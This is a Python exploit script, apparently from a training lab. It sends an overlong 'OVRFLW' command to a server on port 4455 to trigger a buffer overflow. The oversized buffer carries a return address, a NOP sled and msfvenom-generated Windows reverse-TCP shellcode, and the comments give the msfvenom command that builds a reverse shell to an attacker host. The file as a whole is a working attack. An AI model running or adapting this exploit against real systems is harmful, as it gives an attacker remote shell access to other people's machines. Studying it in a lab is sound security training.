#!/usr/bin/python

### Exploiting BufferOverflow vulnerability in a 
### server running on port 4455
### to generate shell code use msfvenom.
### msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f c -a x86 --platform windows -b "\x00\x04\x05\x3F\x40\x77\x78\xCD\xCE\xE5\xE6"
### Total lenght 3000 bytes
### shell code length 348 bytes
### bad char "\x00\x04\x05\x3F\x40\x77\x78\xCD\xCE\xE5\xE6"
### Jmp address "\x83\x66\x26\x56"

import sys, socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

cmd = "OVRFLW "


shell = ("\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x5a\x15\xf9\x4f\x83\xee\xfc\xe2\xf4\xa6\xfd\x7b\x4f\x5a\x15"
"\x99\xc6\xbf\x24\x39\x2b\xd1\x45\xc9\xc4\x08\x19\x72\x1d\x4e"
"\x9e\x8b\x67\x55\xa2\xb3\x69\x6b\xea\x55\x73\x3b\x69\xfb\x63"
"\x7a\xd4\x36\x42\x5b\xd2\x1b\xbd\x08\x42\x72\x1d\x4a\x9e\xb3"
"\x73\xd1\x59\xe8\x37\xb9\x5d\xf8\x9e\x0b\x9e\xa0\x6f\x5b\xc6"
"\x72\x06\x42\xf6\xc3\x06\xd1\x21\x72\x4e\x8c\x24\x06\xe3\x9b"
"\xda\xf4\x4e\x9d\x2d\x19\x3a\xac\x16\x84\xb7\x61\x68\xdd\x3a"
"\xbe\x4d\x72\x17\x7e\x14\x2a\x29\xd1\x19\xb2\xc4\x02\x09\xf8"
"\x9c\xd1\x11\x72\x4e\x8a\x9c\xbd\x6b\x7e\x4e\xa2\x2e\x03\x4f"
"\xa8\xb0\xba\x4a\xa6\x15\xd1\x07\x12\xc2\x07\x7d\xca\x7d\x5a"
"\x15\x91\x38\x29\x27\xa6\x1b\x32\x59\x8e\x69\x5d\xea\x2c\xf7"
"\xca\x14\xf9\x4f\x73\xd1\xad\x1f\x32\x3c\x79\x24\x5a\xea\x2c"
"\x1f\x0a\x45\xa9\x0f\x0a\x55\xa9\x27\xb0\x1a\x26\xaf\xa5\xc0"
"\x6e\x25\x5f\x7d\x39\xe7\x7c\x0a\x91\x4d\x5a\x14\x42\xc6\xbc"
"\x7f\xe9\x19\x0d\x7d\x60\xea\x2e\x74\x06\x9a\xdf\xd5\x8d\x43"
"\xa5\x5b\xf1\x3a\xb6\x7d\x09\xfa\xf8\x43\x06\x9a\x32\x76\x94"
"\x2b\x5a\x9c\x1a\x18\x0d\x42\xc8\xb9\x30\x07\xa0\x19\xb8\xe8"
"\x9f\x88\x1e\x31\xc5\x4e\x5b\x98\xbd\x6b\x4a\xd3\xf9\x0b\x0e"
"\x45\xaf\x19\x0c\x53\xaf\x01\x0c\x43\xaa\x19\x32\x6c\x35\x70"
"\xdc\xea\x2c\xc6\xba\x5b\xaf\x09\xa5\x25\x91\x47\xdd\x08\x99"
"\xb0\x8f\xae\x09\xfa\xf8\x43\x91\xe9\xcf\xa8\x64\xb0\x8f\x29"
"\xff\x33\x50\x95\x02\xaf\x2f\x10\x42\x08\x49\x67\x96\x25\x5a"
"\x46\x06\x9a")

junk = "\x41" * 1369 + "\x83\x66\x26\x56" * 4 +"\x90" *16 + shell +"\x43" * (3000-1369-4-16-348)
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 4455))
s.send(buffer)
s.recv(1024)
s.close()
